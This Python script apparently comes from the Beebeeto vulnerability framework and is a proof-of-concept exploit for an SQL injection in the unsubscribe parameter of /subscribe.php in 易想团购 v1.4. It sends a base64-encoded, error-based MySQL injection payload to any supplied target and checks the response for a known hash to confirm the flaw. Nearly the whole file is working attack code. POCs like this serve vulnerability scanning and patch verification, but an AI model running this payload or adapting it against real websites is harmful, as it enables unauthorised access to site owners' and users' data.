#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0181',
            'name': '易想团购 v1.4 /subscribe.php unsubscribe参数 SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '易想团购',
            'vul_version': ['1.4'],
            'type': 'SQL Injection',
            'tag': ['易想团购漏洞', 'SQL注入漏洞', '/subscribe.php', 'php'],
            'desc': 'N/A',
            'references': [
                'http://www.it165.net/safe/html/201308/701.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/subscribe.php?act=unsubscribe&code=YScgYW5kKHNlbGVjdCAxIGZyb20oc2VsZWN0IGNvdW50K"
                   "CopLGNvbmNhdCgoc2VsZWN0IChzZWxlY3QgKHNlbGVjdCBjb25jYXQoMHg3ZSxtZDUoNjY2KSwweDdlKS"
                   "kpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBsaW1pdCAwLDEpLGZsb29yKHJhbmQoMCkqMik"
                   "peCBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgZ3JvdXAgYnkgeClhKSM=")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())